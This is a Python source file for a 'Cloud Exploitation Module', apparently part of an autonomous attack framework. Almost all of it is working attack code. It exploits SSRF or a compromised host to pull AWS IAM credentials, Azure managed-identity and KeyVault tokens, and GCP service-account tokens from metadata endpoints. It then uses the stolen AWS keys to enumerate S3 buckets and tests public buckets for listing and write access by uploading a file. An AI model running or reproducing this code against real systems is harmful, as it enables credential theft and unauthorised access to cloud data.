"""
Cloud Exploitation Module
AWS, Azure, GCP metadata exploitation and cloud-specific attacks
"""

import json
import re
from typing import Dict, List, Optional

class CloudExploitModule:
    """
    Cloud-specific exploitation techniques for AWS, Azure, and GCP.
    """
    
    def __init__(self):
        self.metadata_endpoints = {
            'aws': 'http://169.254.169.254/latest/meta-data/',
            'azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'gcp': 'http://metadata.google.internal/computeMetadata/v1/'
        }
    
    def exploit_aws_metadata(self, ssrf_url: str = None, session_id: str = None, callback=None) -> Dict:
        """
        Extract AWS credentials and metadata via SSRF or direct access.
        
        Args:
            ssrf_url: URL with SSRF vulnerability (if exploiting via SSRF)
            session_id: Session ID (if already on EC2 instance)
            callback: Optional callback
        
        Returns:
            Extracted AWS credentials and metadata
        """
        if callback:
            callback({'message': f'üî• Exploiting AWS metadata service...'})
        
        results = {
            'success': False,
            'provider': 'aws',
            'credentials': {},
            'metadata': {},
            'iam_role': None
        }
        
        # Metadata endpoints to extract
        metadata_paths = [
            'iam/security-credentials/',  # IAM role name
            'meta-data/instance-id',
            'meta-data/local-ipv4',
            'meta-data/public-ipv4',
            'meta-data/ami-id',
            'meta-data/placement/availability-zone',
            'user-data'  # May contain sensitive info
        ]
        
        base_url = self.metadata_endpoints['aws']
        
        # Step 1: Get IAM role name
        if callback:
            callback({'message': f'  üîç Discovering IAM role...'})
        
        role_url = f"{base_url}iam/security-credentials/"
        role_name = self._fetch_metadata(role_url, ssrf_url, session_id, callback)
        
        if role_name:
            results['iam_role'] = role_name.strip()
            
            if callback:
                callback({'message': f'‚úÖ Found IAM role: {results["iam_role"]}'})
            
            # Step 2: Get credentials for the role
            creds_url = f"{base_url}iam/security-credentials/{results['iam_role']}"
            creds_json = self._fetch_metadata(creds_url, ssrf_url, session_id, callback)
            
            if creds_json:
                try:
                    creds = json.loads(creds_json)
                    results['credentials'] = {
                        'AccessKeyId': creds.get('AccessKeyId'),
                        'SecretAccessKey': creds.get('SecretAccessKey'),
                        'Token': creds.get('Token'),
                        'Expiration': creds.get('Expiration')
                    }
                    
                    results['success'] = True
                    
                    if callback:
                        callback({'message': f'‚úÖ AWS credentials extracted!'})
                        callback({'message': f'  üîë AccessKeyId: {creds.get("AccessKeyId")[:20]}...'})
                except:
                    pass
        
        # Step 3: Extract additional metadata
        for path in metadata_paths:
            if 'security-credentials' in path:
                continue  # Already extracted
            
            url = f"{base_url}{path}"
            data = self._fetch_metadata(url, ssrf_url, session_id, callback)
            
            if data:
                results['metadata'][path] = data.strip()
        
        # Step 4: Enumerate S3 buckets (if credentials obtained)
        if results['credentials'].get('AccessKeyId'):
            if callback:
                callback({'message': f'  ü™£ Enumerating S3 buckets...'})
            
            buckets = self._enumerate_s3_buckets(results['credentials'], callback)
            if buckets:
                results['s3_buckets'] = buckets
        
        return results
    
    def exploit_azure_metadata(self, ssrf_url: str = None, session_id: str = None, callback=None) -> Dict:
        """
        Extract Azure managed identity tokens and metadata.
        
        Args:
            ssrf_url: URL with SSRF vulnerability
            session_id: Session ID (if already on Azure VM)
            callback: Optional callback
        
        Returns:
            Extracted Azure tokens and metadata
        """
        if callback:
            callback({'message': f'üî• Exploiting Azure metadata service...'})
        
        results = {
            'success': False,
            'provider': 'azure',
            'tokens': [],
            'metadata': {}
        }
        
        base_url = self.metadata_endpoints['azure']
        
        # Azure requires Metadata: true header
        headers = {'Metadata': 'true'}
        
        # Step 1: Get instance metadata
        if callback:
            callback({'message': f'  üîç Fetching instance metadata...'})
        
        metadata_json = self._fetch_metadata(base_url, ssrf_url, session_id, callback, headers)
        
        if metadata_json:
            try:
                metadata = json.loads(metadata_json)
                results['metadata'] = metadata
                results['success'] = True
                
                if callback:
                    callback({'message': f'‚úÖ Azure metadata extracted'})
            except:
                pass
        
        # Step 2: Get managed identity token
        token_url = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
        
        if callback:
            callback({'message': f'  üîë Requesting managed identity token...'})
        
        token_json = self._fetch_metadata(token_url, ssrf_url, session_id, callback, headers)
        
        if token_json:
            try:
                token_data = json.loads(token_json)
                results['tokens'].append({
                    'access_token': token_data.get('access_token'),
                    'resource': 'https://management.azure.com/',
                    'token_type': token_data.get('token_type'),
                    'expires_on': token_data.get('expires_on')
                })
                
                if callback:
                    callback({'message': f'‚úÖ Azure access token obtained!'})
            except:
                pass
        
        # Step 3: Try to get KeyVault token
        kv_token_url = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'
        
        kv_token_json = self._fetch_metadata(kv_token_url, ssrf_url, session_id, callback, headers)
        
        if kv_token_json:
            try:
                token_data = json.loads(kv_token_json)
                results['tokens'].append({
                    'access_token': token_data.get('access_token'),
                    'resource': 'https://vault.azure.net',
                    'token_type': token_data.get('token_type')
                })
                
                if callback:
                    callback({'message': f'‚úÖ Azure KeyVault token obtained!'})
            except:
                pass
        
        return results
    
    def exploit_gcp_metadata(self, ssrf_url: str = None, session_id: str = None, callback=None) -> Dict:
        """
        Extract GCP service account tokens and metadata.
        
        Args:
            ssrf_url: URL with SSRF vulnerability
            session_id: Session ID (if already on GCP instance)
            callback: Optional callback
        
        Returns:
            Extracted GCP tokens and metadata
        """
        if callback:
            callback({'message': f'üî• Exploiting GCP metadata service...'})
        
        results = {
            'success': False,
            'provider': 'gcp',
            'tokens': [],
            'metadata': {},
            'service_accounts': []
        }
        
        base_url = self.metadata_endpoints['gcp']
        
        # GCP requires Metadata-Flavor: Google header
        headers = {'Metadata-Flavor': 'Google'}
        
        # Metadata endpoints
        metadata_paths = {
            'project-id': 'project/project-id',
            'instance-id': 'instance/id',
            'instance-name': 'instance/name',
            'zone': 'instance/zone',
            'service-accounts': 'instance/service-accounts/'
        }
        
        # Step 1: Extract metadata
        for key, path in metadata_paths.items():
            url = f"{base_url}{path}"
            data = self._fetch_metadata(url, ssrf_url, session_id, callback, headers)
            
            if data:
                results['metadata'][key] = data.strip()
        
        # Step 2: Get service account list
        sa_list_url = f"{base_url}instance/service-accounts/"
        sa_list = self._fetch_metadata(sa_list_url, ssrf_url, session_id, callback, headers)
        
        if sa_list:
            service_accounts = [sa.strip() for sa in sa_list.split('\n') if sa.strip()]
            results['service_accounts'] = service_accounts
            
            if callback:
                callback({'message': f'‚úÖ Found {len(service_accounts)} service accounts'})
            
            # Step 3: Get tokens for each service account
            for sa in service_accounts:
                if callback:
                    callback({'message': f'  üîë Requesting token for {sa}...'})
                
                token_url = f"{base_url}instance/service-accounts/{sa}/token"
                token_json = self._fetch_metadata(token_url, ssrf_url, session_id, callback, headers)
                
                if token_json:
                    try:
                        token_data = json.loads(token_json)
                        results['tokens'].append({
                            'service_account': sa,
                            'access_token': token_data.get('access_token'),
                            'token_type': token_data.get('token_type'),
                            'expires_in': token_data.get('expires_in')
                        })
                        
                        results['success'] = True
                        
                        if callback:
                            callback({'message': f'‚úÖ Token obtained for {sa}'})
                    except:
                        pass
        
        return results
    
    def exploit_s3_bucket(self, bucket_name: str, callback=None) -> Dict:
        """
        Test S3 bucket for public access and enumerate contents.
        
        Args:
            bucket_name: S3 bucket name
            callback: Optional callback
        
        Returns:
            Bucket enumeration results
        """
        if callback:
            callback({'message': f'üî• Testing S3 bucket: {bucket_name}...'})
        
        results = {
            'success': False,
            'bucket_name': bucket_name,
            'accessible': False,
            'listable': False,
            'writable': False,
            'files': []
        }
        
        # Test different S3 URL formats
        s3_urls = [
            f'https://{bucket_name}.s3.amazonaws.com',
            f'https://s3.amazonaws.com/{bucket_name}',
            f'https://s3-us-west-2.amazonaws.com/{bucket_name}'
        ]
        
        for s3_url in s3_urls:
            # Try to list bucket contents
            list_result = self._test_s3_list(s3_url, callback)
            
            if list_result and list_result.get('accessible'):
                results['accessible'] = True
                results['listable'] = list_result.get('listable', False)
                results['files'] = list_result.get('files', [])
                results['success'] = True
                
                if callback:
                    callback({'message': f'‚úÖ Bucket is accessible!'})
                    if results['listable']:
                        callback({'message': f'  üìã Found {len(results["files"])} files'})
                
                # Test if writable
                write_result = self._test_s3_write(s3_url, callback)
                if write_result and write_result.get('writable'):
                    results['writable'] = True
                    
                    if callback:
                        callback({'message': f'üö® Bucket is WRITABLE! Can upload files.'})
                
                break
        
        if not results['accessible']:
            if callback:
                callback({'message': f'‚ùå Bucket not publicly accessible'})
        
        return results
    
    def _fetch_metadata(self, url: str, ssrf_url: str = None, session_id: str = None, 
                       callback=None, headers: Dict = None) -> Optional[str]:
        """Fetch metadata via SSRF or direct access - REAL IMPLEMENTATION."""
        import urllib.parse
        
        if ssrf_url:
            # Exploit via SSRF vulnerability
            import requests
            
            try:
                # Encode metadata URL as parameter
                encoded_url = urllib.parse.quote(url, safe='')
                final_url = ssrf_url.replace('SSRF_PARAM', encoded_url)
                
                # Send SSRF request
                response = requests.get(final_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    return response.text
                    
            except Exception as e:
                if callback:
                    callback({'message': f'  ‚ö†Ô∏è SSRF request failed: {str(e)[:100]}'})
            
            return None
        
        elif session_id:
            # Execute from compromised instance
            from autonomous_session_manager import autonomous_session_manager
            
            # Build curl command with headers
            header_flags = ''
            if headers:
                for key, value in headers.items():
                    header_flags += f' -H "{key}: {value}"'
            
            cmd = f'curl -s{header_flags} {url}'
            output = autonomous_session_manager._run_command(session_id, cmd, callback)
            
            return output
        
        return None
    
    def _enumerate_s3_buckets(self, credentials: Dict, callback=None) -> List[str]:
        """Enumerate S3 buckets using AWS credentials - REAL IMPLEMENTATION."""
        try:
            import boto3
            
            # Create S3 client with credentials
            s3_client = boto3.client(
                's3',
                aws_access_key_id=credentials.get('AccessKeyId'),
                aws_secret_access_key=credentials.get('SecretAccessKey'),
                aws_session_token=credentials.get('Token')
            )
            
            # List buckets
            response = s3_client.list_buckets()
            
            buckets = [bucket['Name'] for bucket in response.get('Buckets', [])]
            
            if callback and buckets:
                callback({'message': f'  ü™£ Found {len(buckets)} S3 buckets'})
            
            return buckets
            
        except Exception as e:
            if callback:
                callback({'message': f'  ‚ö†Ô∏è S3 enumeration failed: {str(e)[:100]}'})
        
        return []
    
    def _test_s3_list(self, s3_url: str, callback=None) -> Optional[Dict]:
        """Test if S3 bucket is listable - REAL IMPLEMENTATION."""
        import requests
        import xml.etree.ElementTree as ET
        
        try:
            response = requests.get(s3_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Try to parse XML for file listing
                try:
                    root = ET.fromstring(response.text)
                    
                    # Extract file keys
                    files = []
                    for contents in root.findall('.//{http://s3.amazonaws.com/doc/2006-03-01/}Contents'):
                        key_elem = contents.find('{http://s3.amazonaws.com/doc/2006-03-01/}Key')
                        if key_elem is not None:
                            files.append(key_elem.text)
                    
                    return {
                        'accessible': True,
                        'listable': True,
                        'files': files
                    }
                except:
                    # Not XML, but accessible
                    return {
                        'accessible': True,
                        'listable': False,
                        'files': []
                    }
            
        except Exception as e:
            if callback:
                callback({'message': f'  ‚ö†Ô∏è S3 listing failed: {str(e)[:100]}'})
        
        return None
    
    def _test_s3_write(self, s3_url: str, callback=None) -> Optional[Dict]:
        """Test if S3 bucket is writable - REAL IMPLEMENTATION."""
        import requests
        
        try:
            # Try to upload a test file
            test_data = "test"
            test_filename = "test_write_check.txt"
            
            upload_url = f"{s3_url}/{test_filename}"
            
            response = requests.put(
                upload_url,
                data=test_data,
                timeout=10,
                verify=False
            )
            
            # Check if upload was successful
            if response.status_code in [200, 204]:
                return {
                    'writable': True
                }
            
        except Exception as e:
            if callback:
                callback({'message': f'  ‚ö†Ô∏è S3 write test failed: {str(e)[:100]}'})
        
        return {'writable': False}

# Singleton instance
cloud_exploit_module = CloudExploitModule()
